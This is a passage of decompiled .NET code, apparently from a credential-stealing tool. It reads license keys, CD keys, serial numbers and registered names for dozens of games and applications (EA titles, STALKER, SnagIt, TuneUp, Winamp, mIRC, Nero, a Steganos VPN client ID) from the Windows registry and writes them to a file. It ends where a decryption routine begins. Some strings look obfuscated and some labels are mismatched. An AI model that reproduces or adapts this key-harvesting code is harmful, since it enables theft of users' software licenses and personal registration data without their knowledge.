					goto IL_3e49;
					IL_3e49:
					num = 879;
					streamWriter.Flush();
					goto IL_3e57;
					IL_3e57:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3e5f;
					IL_3e5f:
					num = 881;
					text148 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4", "ergc", null));
					goto IL_3e7d;
					IL_3e7d:
					num = 882;
					streamWriter.WriteLine("Sim City 4 : " + text148);
					goto IL_3e97;
					IL_3e97:
					num = 883;
					streamWriter.Flush();
					goto IL_3ea5;
					IL_3ea5:
					num = 884;
					streamWriter.WriteLine("");
					goto IL_3eb8;
					IL_3eb8:
					num = 885;
					streamWriter.Flush();
					goto IL_3ec6;
					IL_3ec6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3ece;
					IL_3ece:
					num = 887;
					text149 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Network Associates, Inc.\\Sniffer Pro\\4.5\\USER", "SerialNumber", null));
					goto IL_3eec;
					IL_3eec:
					num = 888;
					streamWriter.WriteLine("Sniffer Pro 4.5 : " + text149);
					goto IL_3f06;
					IL_3f06:
					num = 889;
					streamWriter.Flush();
					goto IL_3f14;
					IL_3f14:
					num = 890;
					streamWriter.WriteLine("");
					goto IL_3f27;
					IL_3f27:
					num = 891;
					streamWriter.Flush();
					goto IL_3f35;
					IL_3f35:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3f3d;
					IL_3f3d:
					num = 893;
					text150 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_3f5b;
					IL_3f5b:
					num = 894;
					streamWriter.WriteLine("Soldiers Of Anarchy : " + text150);
					goto IL_3f75;
					IL_3f75:
					num = 895;
					streamWriter.Flush();
					goto IL_3f83;
					IL_3f83:
					num = 896;
					streamWriter.WriteLine("");
					goto IL_3f96;
					IL_3f96:
					num = 897;
					streamWriter.Flush();
					goto IL_3fa4;
					IL_3fa4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_3fac;
					IL_3fac:
					num = 899;
					text151 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_3fca;
					IL_3fca:
					num = 900;
					streamWriter.WriteLine("Soldiers Of Anarchy : " + text151);
					goto IL_3fe4;
					IL_3fe4:
					num = 901;
					streamWriter.Flush();
					goto IL_3ff2;
					IL_3ff2:
					num = 902;
					streamWriter.WriteLine("");
					goto IL_4005;
					IL_4005:
					num = 903;
					streamWriter.Flush();
					goto IL_4013;
					IL_4013:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_401b;
					IL_401b:
					num = 905;
					text152 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\GSC Game World\\STALKER-SHOC", "InstallCDKEY", null));
					goto IL_4039;
					IL_4039:
					num = 906;
					streamWriter.WriteLine("Stalker - Shadow of Chernobyl : " + text152);
					goto IL_4053;
					IL_4053:
					num = 907;
					streamWriter.Flush();
					goto IL_4061;
					IL_4061:
					num = 908;
					streamWriter.WriteLine("");
					goto IL_4074;
					IL_4074:
					num = 909;
					streamWriter.Flush();
					goto IL_4082;
					IL_4082:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_408a;
					IL_408a:
					num = 911;
					text153 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.0", "CD pYrTgbzWFEpYpYrT", null));
					goto IL_40a8;
					IL_40a8:
					num = 912;
					streamWriter.WriteLine("Star Wars Battlefront II (v1.0) : " + text153);
					goto IL_40c2;
					IL_40c2:
					num = 913;
					streamWriter.Flush();
					goto IL_40d0;
					IL_40d0:
					num = 914;
					streamWriter.WriteLine("");
					goto IL_40e3;
					IL_40e3:
					num = 915;
					streamWriter.Flush();
					goto IL_40f1;
					IL_40f1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_40f9;
					IL_40f9:
					num = 917;
					text154 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.1", "CD pYrTgbzWFEpYpYrT", null));
					goto IL_4117;
					IL_4117:
					num = 918;
					streamWriter.WriteLine("Star Wars Battlefront II (v1.1) : " + text154);
					goto IL_4131;
					IL_4131:
					num = 919;
					streamWriter.Flush();
					goto IL_413f;
					IL_413f:
					num = 920;
					streamWriter.WriteLine("");
					goto IL_4152;
					IL_4152:
					num = 921;
					streamWriter.Flush();
					goto IL_4160;
					IL_4160:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4168;
					IL_4168:
					num = 923;
					text155 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_4186;
					IL_4186:
					num = 924;
					streamWriter.WriteLine("Steganos Internet Anonym VPN : " + text155);
					goto IL_41a0;
					IL_41a0:
					num = 925;
					streamWriter.Flush();
					goto IL_41ae;
					IL_41ae:
					num = 926;
					streamWriter.WriteLine("");
					goto IL_41c1;
					IL_41c1:
					num = 927;
					streamWriter.Flush();
					goto IL_41cf;
					IL_41cf:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_41d7;
					IL_41d7:
					num = 929;
					text156 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_41f5;
					IL_41f5:
					num = 930;
					streamWriter.WriteLine("Splinter Cell Pandora Tomorrow : " + text156);
					goto IL_420f;
					IL_420f:
					num = 931;
					streamWriter.Flush();
					goto IL_421d;
					IL_421d:
					num = 932;
					streamWriter.WriteLine("");
					goto IL_4230;
					IL_4230:
					num = 933;
					streamWriter.Flush();
					goto IL_423e;
					IL_423e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4246;
					IL_4246:
					num = 935;
					text157 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\THQ\\Gas Powered Games\\Supreme Commander", "KEY", null));
					goto IL_4264;
					IL_4264:
					num = 936;
					streamWriter.WriteLine("Surpreme Commander : " + text157);
					goto IL_427e;
					IL_427e:
					num = 937;
					streamWriter.Flush();
					goto IL_428c;
					IL_428c:
					num = 938;
					streamWriter.WriteLine("");
					goto IL_429f;
					IL_429f:
					num = 939;
					streamWriter.Flush();
					goto IL_42ad;
					IL_42ad:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_42b5;
					IL_42b5:
					num = 941;
					text158 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat2", null));
					goto IL_42d3;
					IL_42d3:
					num = 942;
					streamWriter.WriteLine("S.W.A.T 2 : " + text158);
					goto IL_42ed;
					IL_42ed:
					num = 943;
					streamWriter.Flush();
					goto IL_42fb;
					IL_42fb:
					num = 944;
					streamWriter.WriteLine("");
					goto IL_430e;
					IL_430e:
					num = 945;
					streamWriter.Flush();
					goto IL_431c;
					IL_431c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4324;
					IL_4324:
					num = 947;
					text159 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat3", null));
					goto IL_4342;
					IL_4342:
					num = 948;
					streamWriter.WriteLine("S.W.A.T 3 : " + text159);
					goto IL_435c;
					IL_435c:
					num = 949;
					streamWriter.Flush();
					goto IL_436a;
					IL_436a:
					num = 950;
					streamWriter.WriteLine("");
					goto IL_437d;
					IL_437d:
					num = 951;
					streamWriter.Flush();
					goto IL_438b;
					IL_438b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4393;
					IL_4393:
					num = 953;
					text160 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat4", null));
					goto IL_43b1;
					IL_43b1:
					num = 954;
					streamWriter.WriteLine("S.W.A.T 4 : " + text160);
					goto IL_43cb;
					IL_43cb:
					num = 955;
					streamWriter.Flush();
					goto IL_43d9;
					IL_43d9:
					num = 956;
					streamWriter.WriteLine("");
					goto IL_43ec;
					IL_43ec:
					num = 957;
					streamWriter.Flush();
					goto IL_43fa;
					IL_43fa:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4402;
					IL_4402:
					num = 959;
					text161 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegisteredTo", null));
					goto IL_4420;
					IL_4420:
					num = 960;
					streamWriter.WriteLine("TechSmith SnagIt (Name) : " + text161);
					goto IL_443a;
					IL_443a:
					num = 961;
					streamWriter.Flush();
					goto IL_4448;
					IL_4448:
					num = 962;
					streamWriter.WriteLine("");
					goto IL_445b;
					IL_445b:
					num = 963;
					streamWriter.Flush();
					goto IL_4469;
					IL_4469:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4471;
					IL_4471:
					num = 965;
					text162 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_448f;
					IL_448f:
					num = 966;
					streamWriter.WriteLine("TechSmith SnagIt (Name) : " + text162);
					goto IL_44a9;
					IL_44a9:
					num = 967;
					streamWriter.Flush();
					goto IL_44b7;
					IL_44b7:
					num = 968;
					streamWriter.WriteLine("");
					goto IL_44ca;
					IL_44ca:
					num = 969;
					streamWriter.Flush();
					goto IL_44d8;
					IL_44d8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_44e0;
					IL_44e0:
					num = 971;
					text163 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_44fe;
					IL_44fe:
					num = 972;
					streamWriter.WriteLine("TechSmith SnagIt (Serial) : " + text163);
					goto IL_4518;
					IL_4518:
					num = 973;
					streamWriter.Flush();
					goto IL_4526;
					IL_4526:
					num = 974;
					streamWriter.WriteLine("");
					goto IL_4539;
					IL_4539:
					num = 975;
					streamWriter.Flush();
					goto IL_4547;
					IL_4547:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_454f;
					IL_454f:
					num = 977;
					text164 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Owner Name", null));
					goto IL_456d;
					IL_456d:
					num = 978;
					streamWriter.WriteLine("Texas Calculatem 4 (Owner) : " + text164);
					goto IL_4587;
					IL_4587:
					num = 979;
					streamWriter.Flush();
					goto IL_4595;
					IL_4595:
					num = 980;
					streamWriter.WriteLine("");
					goto IL_45a8;
					IL_45a8:
					num = 981;
					streamWriter.Flush();
					goto IL_45b6;
					IL_45b6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_45be;
					IL_45be:
					num = 983;
					text165 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Registration pYrTgbzWFEpYpYrT", null));
					goto IL_45dc;
					IL_45dc:
					num = 984;
					streamWriter.WriteLine("Texas Calculatem 4 (Owner) : " + text165);
					goto IL_45f6;
					IL_45f6:
					num = 985;
					streamWriter.Flush();
					goto IL_4604;
					IL_4604:
					num = 986;
					streamWriter.WriteLine("");
					goto IL_4617;
					IL_4617:
					num = 987;
					streamWriter.Flush();
					goto IL_4625;
					IL_4625:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_462d;
					IL_462d:
					num = 989;
					text166 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Battle for Middle-earth", "ergc", null));
					goto IL_464b;
					IL_464b:
					num = 990;
					streamWriter.WriteLine("The Battle for Middle-earth : " + text166);
					goto IL_4665;
					IL_4665:
					num = 991;
					streamWriter.Flush();
					goto IL_4673;
					IL_4673:
					num = 992;
					streamWriter.WriteLine("");
					goto IL_4686;
					IL_4686:
					num = 993;
					streamWriter.Flush();
					goto IL_4694;
					IL_4694:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_469c;
					IL_469c:
					num = 995;
					text167 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Games\\The Orange Box", "ergc", null));
					goto IL_46ba;
					IL_46ba:
					num = 996;
					streamWriter.WriteLine("The Orange Box : " + text167);
					goto IL_46d4;
					IL_46d4:
					num = 997;
					streamWriter.Flush();
					goto IL_46e2;
					IL_46e2:
					num = 998;
					streamWriter.WriteLine("");
					goto IL_46f5;
					IL_46f5:
					num = 999;
					streamWriter.Flush();
					goto IL_4703;
					IL_4703:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_470b;
					IL_470b:
					num = 1001;
					text168 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "Timeshift", null));
					goto IL_4729;
					IL_4729:
					num = 1002;
					streamWriter.WriteLine("The Orange Box : " + text168);
					goto IL_4743;
					IL_4743:
					num = 1003;
					streamWriter.Flush();
					goto IL_4751;
					IL_4751:
					num = 1004;
					streamWriter.WriteLine("");
					goto IL_4764;
					IL_4764:
					num = 1005;
					streamWriter.Flush();
					goto IL_4772;
					IL_4772:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_477a;
					IL_477a:
					num = 1007;
					text169 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Pegasys Inc.\\TMPGEnc DVD Author\\1.0", "RegistrationCode", null));
					goto IL_4798;
					IL_4798:
					num = 1008;
					streamWriter.WriteLine("TMPGEnc DVD Author : " + text169);
					goto IL_47b2;
					IL_47b2:
					num = 1009;
					streamWriter.Flush();
					goto IL_47c0;
					IL_47c0:
					num = 1010;
					streamWriter.WriteLine("");
					goto IL_47d3;
					IL_47d3:
					num = 1011;
					streamWriter.Flush();
					goto IL_47e1;
					IL_47e1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_47e9;
					IL_47e9:
					num = 1013;
					text170 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "UserName", null));
					goto IL_4807;
					IL_4807:
					num = 1014;
					streamWriter.WriteLine("TuneUp 2007 (Name) : " + text170);
					goto IL_4821;
					IL_4821:
					num = 1015;
					streamWriter.Flush();
					goto IL_482f;
					IL_482f:
					num = 1016;
					streamWriter.WriteLine("");
					goto IL_4842;
					IL_4842:
					num = 1017;
					streamWriter.Flush();
					goto IL_4850;
					IL_4850:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4858;
					IL_4858:
					num = 1019;
					text171 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "RegCode", null));
					goto IL_4876;
					IL_4876:
					num = 1020;
					streamWriter.WriteLine("TuneUp 2007 (pYrTgbzWFEpYpYrT) : " + text171);
					goto IL_4890;
					IL_4890:
					num = 1021;
					streamWriter.Flush();
					goto IL_489e;
					IL_489e:
					num = 1022;
					streamWriter.WriteLine("");
					goto IL_48b1;
					IL_48b1:
					num = 1023;
					streamWriter.Flush();
					goto IL_48bf;
					IL_48bf:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_48c7;
					IL_48c7:
					num = 1025;
					text172 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\6.0", "Company", null));
					goto IL_48e5;
					IL_48e5:
					num = 1026;
					streamWriter.WriteLine("TuneUp 2007 (Company) : " + text172);
					goto IL_48ff;
					IL_48ff:
					num = 1027;
					streamWriter.Flush();
					goto IL_490d;
					IL_490d:
					num = 1028;
					streamWriter.WriteLine("");
					goto IL_4920;
					IL_4920:
					num = 1029;
					streamWriter.Flush();
					goto IL_492e;
					IL_492e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4936;
					IL_4936:
					num = 1031;
					text173 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "UserName", null));
					goto IL_4954;
					IL_4954:
					num = 1032;
					streamWriter.WriteLine("TuneUp 2008 (Name) : " + text173);
					goto IL_496e;
					IL_496e:
					num = 1033;
					streamWriter.Flush();
					goto IL_497c;
					IL_497c:
					num = 1034;
					streamWriter.WriteLine("");
					goto IL_498f;
					IL_498f:
					num = 1035;
					streamWriter.Flush();
					goto IL_499d;
					IL_499d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_49a5;
					IL_49a5:
					num = 1037;
					text174 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "RegCode", null));
					goto IL_49c3;
					IL_49c3:
					num = 1038;
					streamWriter.WriteLine("TuneUp 2008 (pYrTgbzWFEpYpYrT) : " + text174);
					goto IL_49dd;
					IL_49dd:
					num = 1039;
					streamWriter.Flush();
					goto IL_49eb;
					IL_49eb:
					num = 1040;
					streamWriter.WriteLine("");
					goto IL_49fe;
					IL_49fe:
					num = 1041;
					streamWriter.Flush();
					goto IL_4a0c;
					IL_4a0c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4a14;
					IL_4a14:
					num = 1043;
					text175 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\7.0", "Company", null));
					goto IL_4a32;
					IL_4a32:
					num = 1044;
					streamWriter.WriteLine("TuneUp 2008 (Company) : " + text175);
					goto IL_4a4c;
					IL_4a4c:
					num = 1045;
					streamWriter.Flush();
					goto IL_4a5a;
					IL_4a5a:
					num = 1046;
					streamWriter.WriteLine("");
					goto IL_4a6d;
					IL_4a6d:
					num = 1047;
					streamWriter.Flush();
					goto IL_4a7b;
					IL_4a7b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4a83;
					IL_4a83:
					num = 1049;
					text176 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "UserName", null));
					goto IL_4aa1;
					IL_4aa1:
					num = 1050;
					streamWriter.WriteLine("TuneUp 2009 (Name) : " + text176);
					goto IL_4abb;
					IL_4abb:
					num = 1051;
					streamWriter.Flush();
					goto IL_4ac9;
					IL_4ac9:
					num = 1052;
					streamWriter.WriteLine("");
					goto IL_4adc;
					IL_4adc:
					num = 1053;
					streamWriter.Flush();
					goto IL_4aea;
					IL_4aea:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4af2;
					IL_4af2:
					num = 1055;
					text177 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "ProductKey", null));
					goto IL_4b10;
					IL_4b10:
					num = 1056;
					streamWriter.WriteLine("TuneUp 2009 (pYrTgbzWFEpYpYrT) : " + text177);
					goto IL_4b2a;
					IL_4b2a:
					num = 1057;
					streamWriter.Flush();
					goto IL_4b38;
					IL_4b38:
					num = 1058;
					streamWriter.WriteLine("");
					goto IL_4b4b;
					IL_4b4b:
					num = 1059;
					streamWriter.Flush();
					goto IL_4b59;
					IL_4b59:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4b61;
					IL_4b61:
					num = 1061;
					text178 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TuneUp\\Utilities\\8.0", "Company", null));
					goto IL_4b7f;
					IL_4b7f:
					num = 1062;
					streamWriter.WriteLine("TuneUp 2009 (Company) : " + text178);
					goto IL_4b99;
					IL_4b99:
					num = 1063;
					streamWriter.Flush();
					goto IL_4ba7;
					IL_4ba7:
					num = 1064;
					streamWriter.WriteLine("");
					goto IL_4bba;
					IL_4bba:
					num = 1065;
					streamWriter.Flush();
					goto IL_4bc8;
					IL_4bc8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4bd0;
					IL_4bd0:
					num = 1067;
					text179 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regname", null));
					goto IL_4bee;
					IL_4bee:
					num = 1068;
					streamWriter.WriteLine("Winamp (Username) : " + text179);
					goto IL_4c08;
					IL_4c08:
					num = 1069;
					streamWriter.Flush();
					goto IL_4c16;
					IL_4c16:
					num = 1070;
					streamWriter.WriteLine("");
					goto IL_4c29;
					IL_4c29:
					num = 1071;
					streamWriter.Flush();
					goto IL_4c37;
					IL_4c37:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4c3f;
					IL_4c3f:
					num = 1073;
					text180 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nullsoft\\Winamp", "regkey", null));
					goto IL_4c5d;
					IL_4c5d:
					num = 1074;
					streamWriter.WriteLine("Winamp (Serial) : " + text180);
					goto IL_4c77;
					IL_4c77:
					num = 1075;
					streamWriter.Flush();
					goto IL_4c85;
					IL_4c85:
					num = 1076;
					streamWriter.WriteLine("");
					goto IL_4c98;
					IL_4c98:
					num = 1077;
					streamWriter.Flush();
					goto IL_4ca6;
					IL_4ca6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4cae;
					IL_4cae:
					num = 1079;
					text181 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Sims\\The Sims 3\\ergc", "", "E_NotFound"));
					goto IL_4cd0;
					IL_4cd0:
					num = 1080;
					streamWriter.WriteLine("The Sims 3 : " + text181);
					goto IL_4cea;
					IL_4cea:
					num = 1081;
					streamWriter.Flush();
					goto IL_4cf8;
					IL_4cf8:
					num = 1082;
					streamWriter.WriteLine("");
					goto IL_4d0b;
					IL_4d0b:
					num = 1083;
					streamWriter.Flush();
					goto IL_4d19;
					IL_4d19:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4d21;
					IL_4d21:
					num = 1085;
					text182 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\SPORE(TM)\\ergc ", "", "E_NotFound"));
					goto IL_4d43;
					IL_4d43:
					num = 1086;
					streamWriter.WriteLine("Spore : " + text182);
					goto IL_4d5d;
					IL_4d5d:
					num = 1087;
					streamWriter.Flush();
					goto IL_4d6b;
					IL_4d6b:
					num = 1088;
					streamWriter.WriteLine("");
					goto IL_4d7e;
					IL_4d7e:
					num = 1089;
					streamWriter.Flush();
					goto IL_4d8c;
					IL_4d8c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4d94;
					IL_4d94:
					num = 1091;
					text183 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Mirror's Edge\\ergc ", "", "E_NotFound"));
					goto IL_4db6;
					IL_4db6:
					num = 1092;
					streamWriter.WriteLine("Mirrors Edge : " + text183);
					goto IL_4dd0;
					IL_4dd0:
					num = 1093;
					streamWriter.Flush();
					goto IL_4dde;
					IL_4dde:
					num = 1094;
					streamWriter.WriteLine("");
					goto IL_4df1;
					IL_4df1:
					num = 1095;
					streamWriter.Flush();
					goto IL_4dff;
					IL_4dff:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4e07;
					IL_4e07:
					num = 1097;
					text184 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Rockstar Games\\Grand Theft Auto IV", "", "CDKey"));
					goto IL_4e29;
					IL_4e29:
					num = 1098;
					streamWriter.WriteLine("GTA IV : " + text184);
					goto IL_4e43;
					IL_4e43:
					num = 1099;
					streamWriter.Flush();
					goto IL_4e51;
					IL_4e51:
					num = 1100;
					streamWriter.WriteLine("");
					goto IL_4e64;
					IL_4e64:
					num = 1101;
					streamWriter.Flush();
					goto IL_4e72;
					IL_4e72:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4e7a;
					IL_4e7a:
					num = 1103;
					text185 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 09\\ergc", "", "E_NotFound"));
					goto IL_4e9c;
					IL_4e9c:
					num = 1104;
					streamWriter.WriteLine("FIFA 2009 : " + text185);
					goto IL_4eb6;
					IL_4eb6:
					num = 1105;
					streamWriter.Flush();
					goto IL_4ec4;
					IL_4ec4:
					num = 1106;
					streamWriter.WriteLine("");
					goto IL_4ed7;
					IL_4ed7:
					num = 1107;
					streamWriter.Flush();
					goto IL_4ee5;
					IL_4ee5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4eed;
					IL_4eed:
					num = 1109;
					text186 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\KONAMI\\PES2009", "", ""));
					goto IL_4f0f;
					IL_4f0f:
					num = 1110;
					streamWriter.WriteLine("Pro Evolution Soccer 2009 : " + text186);
					goto IL_4f29;
					IL_4f29:
					num = 1111;
					streamWriter.Flush();
					goto IL_4f37;
					IL_4f37:
					num = 1112;
					streamWriter.WriteLine("");
					goto IL_4f4a;
					IL_4f4a:
					num = 1113;
					streamWriter.Flush();
					goto IL_4f58;
					IL_4f58:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4f60;
					IL_4f60:
					num = 1115;
					text187 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA Sports\\FIFA 08\\ergc", "", "E_NotFound"));
					goto IL_4f82;
					IL_4f82:
					num = 1116;
					streamWriter.WriteLine("FIFA 2008 : " + text187);
					goto IL_4f9c;
					IL_4f9c:
					num = 1117;
					streamWriter.Flush();
					goto IL_4faa;
					IL_4faa:
					num = 1118;
					streamWriter.WriteLine("");
					goto IL_4fbd;
					IL_4fbd:
					num = 1119;
					streamWriter.Flush();
					goto IL_4fcb;
					IL_4fcb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_4fd3;
					IL_4fd3:
					num = 1121;
					text188 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\NERO\\SHARED\\FAMILIES\\NL9", "", "Serial"));
					goto IL_4ff5;
					IL_4ff5:
					num = 1122;
					streamWriter.WriteLine("Nero 9 : " + text188);
					goto IL_500f;
					IL_500f:
					num = 1123;
					streamWriter.Flush();
					goto IL_501d;
					IL_501d:
					num = 1124;
					streamWriter.WriteLine("");
					goto IL_5030;
					IL_5030:
					num = 1125;
					streamWriter.Flush();
					goto IL_503e;
					IL_503e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_5046;
					IL_5046:
					num = 1127;
					text189 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\", "", "UserName"));
					goto IL_5068;
					IL_5068:
					num = 1128;
					streamWriter.WriteLine("Mirc (Username) : " + text189);
					goto IL_5082;
					IL_5082:
					num = 1129;
					streamWriter.Flush();
					goto IL_5090;
					IL_5090:
					num = 1130;
					streamWriter.WriteLine("");
					goto IL_50a3;
					IL_50a3:
					num = 1131;
					streamWriter.Flush();
					goto IL_50b1;
					IL_50b1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_50b9;
					IL_50b9:
					num = 1133;
					text190 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\", "", "License"));
					goto IL_50db;
					IL_50db:
					num = 1134;
					streamWriter.WriteLine("Mirc (Serial pYrTgbzWFEpYpYrT) : " + text190);
					goto IL_50f5;
					IL_50f5:
					num = 1135;
					streamWriter.Flush();
					goto IL_5103;
					IL_5103:
					num = 1136;
					streamWriter.WriteLine("");
					goto IL_5116;
					IL_5116:
					num = 1137;
					streamWriter.Flush();
					goto IL_5124;
					IL_5124:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_512c;
					IL_512c:
					num = 1139;
					text191 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Orange Box", "", "ergc"));
					goto IL_514e;
					IL_514e:
					num = 1140;
					streamWriter.WriteLine("Orange Box : " + text191);
					goto IL_5168;
					IL_5168:
					num = 1141;
					streamWriter.Flush();
					goto IL_5176;
					IL_5176:
					num = 1142;
					streamWriter.WriteLine("");
					goto IL_5189;
					IL_5189:
					num = 1143;
					streamWriter.Flush();
					goto IL_5197;
					IL_5197:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_519f;
					IL_519f:
					num = 1145;
					text192 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Orange Box", "", "ergc"));
					goto IL_51c1;
					IL_51c1:
					num = 1146;
					streamWriter.WriteLine("Orange Box : " + text192);
					goto IL_51db;
					IL_51db:
					num = 1147;
					streamWriter.Flush();
					goto IL_51e9;
					IL_51e9:
					num = 1148;
					streamWriter.WriteLine("");
					goto IL_51fc;
					IL_51fc:
					num = 1149;
					streamWriter.Flush();
					goto IL_520a;
					end_IL_0000_2:
					break;
				}
				num = 1151;
				streamWriter.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 25661;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public string GetDecryptedData(string Data)
	{
		byte[] bytes = Convert.FromBase64String(Data);
